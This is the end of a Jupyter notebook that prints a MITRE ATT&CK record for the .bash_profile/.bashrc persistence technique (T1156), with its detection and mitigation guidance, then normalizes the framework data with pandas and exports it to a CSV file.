       "{'matrix': 'mitre-attack',\n",
       " 'mitigation': '.bash_profile and .bashrc Mitigation',\n",
       " 'mitigation_description': 'Making these files immutable and only changeable by certain administrators will limit the ability for adversaries to easily create user level persistence.',\n",
       " 'mitigation_references': ['https://attack.mitre.org/techniques/T1156'],\n",
       " 'technique': '.bash_profile and .bashrc',\n",
       " 'technique_description': \"<code>~/.bash_profile</code> and <code>~/.bashrc</code> are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. <code>~/.bash_profile</code> is executed for login shells and <code>~/.bashrc</code> is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), <code>~/.bash_profile</code> is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, <code>~/.bashrc</code> is executed. This allows users more fine grained control over when they want certain commands executed.\\n\\nMac's Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling <code>~/.bash_profile</code> each time instead of <code>~/.bashrc</code>.\\n\\nThese files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell  (Citation: amnesia malware).\",\n",
       " 'technique_detection': 'While users may customize their <code>~/.bashrc</code> and <code>~/.bash_profile</code> files , there are only certain types of commands that typically appear in these files. Monitor for abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network when user profiles are loaded during the login process.',\n",
       " 'tactic': ['persistence'],\n",
       " 'url': 'https://attack.mitre.org/techniques/T1156',\n",
       " 'technique_id': 'T1156',\n",
       " 'capec_id': None,\n",
       " 'capec_url': None,\n",
       " 'platform': ['Linux', 'macOS'],\n",
       " 'data_sources': ['File monitoring',\n",
       "  'Process monitoring',\n",
       "  'Process command-line parameters',\n",
       "  'Process use of network'],\n",
       " 'defense_bypassed': None,\n",
       " 'permissions_required': ['User', 'Administrator'],\n",
       " 'effective_permissions': None,\n",
       " 'system_requirements': None,\n",
       " 'network_requirements': None,\n",
       " 'remote_support': None,\n",
       " 'contributors': None,\n",
       " 'technique_references': ['https://attack.mitre.org/techniques/T1156',\n",
       "  'https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/'],\n",
       " 'detectable_by_common_defenses': None,\n",
       " 'detectable_explanation': None,\n",
       " 'difficulty_for_adversary': None,\n",
       " 'difficulty_explanation': None,\n",
       " 'tactic_type': None}"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "all_attack_framework[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Showing schema of the results"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = json_normalize(all_attack_framework)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['capec_id',\n",
       " 'capec_url',\n",
       " 'contributors',\n",
       " 'created',\n",
       " 'created_by_ref',\n",
       " 'data_sources',\n",
       " 'defense_bypassed',\n",
       " 'detectable_by_common_defenses',\n",
       " 'detectable_explanation',\n",
       " 'difficulty_explanation',\n",
       " 'difficulty_for_adversary',\n",
       " 'effective_permissions',\n",
       " 'group',\n",
       " 'group_aliases',\n",
       " 'group_description',\n",
       " 'group_id',\n",
       " 'group_references',\n",
       " 'id',\n",
       " 'matrix',\n",
       " 'mitigation',\n",
       " 'mitigation_description',\n",
       " 'mitigation_references',\n",
       " 'modified',\n",
       " 'network_requirements',\n",
       " 'object_marking_refs',\n",
       " 'permissions_required',\n",
       " 'platform',\n",
       " 'relationship',\n",
       " 'relationship_description',\n",
       " 'relationship_id',\n",
       " 'remote_support',\n",
       " 'software',\n",
       " 'software_aliases',\n",
       " 'software_description',\n",
       " 'software_id',\n",
       " 'software_labels',\n",
       " 'software_platform',\n",
       " 'software_references',\n",
       " 'software_url',\n",
       " 'system_requirements',\n",
       " 'tactic',\n",
       " 'tactic_type',\n",
       " 'target_object',\n",
       " 'technique',\n",
       " 'technique_description',\n",
       " 'technique_detection',\n",
       " 'technique_id',\n",
       " 'technique_references',\n",
       " 'type',\n",
       " 'url']"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "list(df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### We can then export All ATT&CK as a CSV file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = df[[\n",
    "    'matrix','tactic','technique','technique_id','capec_id','capec_url','technique_description','technique_detection',\n",
    "    'mitigation','mitigation_description','group','group_id','group_aliases','group_description','software',\n",
    "    'software_id','software_description','software_labels','software_platform','relationship',\n",
    "    'relationship_description','platform','data_sources','detectable_by_common_defenses','detectable_explanation',\n",
    "    'difficulty_for_adversary','difficulty_explanation','effective_permissions','network_requirements',\n",
    "    'permissions_required','remote_support','system_requirements','contributors','url','technique_references',\n",
    "    'group_references','software_references']]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [],
   "source": [
    "df.to_csv('all_attack.csv',index=False,encoding='utf-8')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
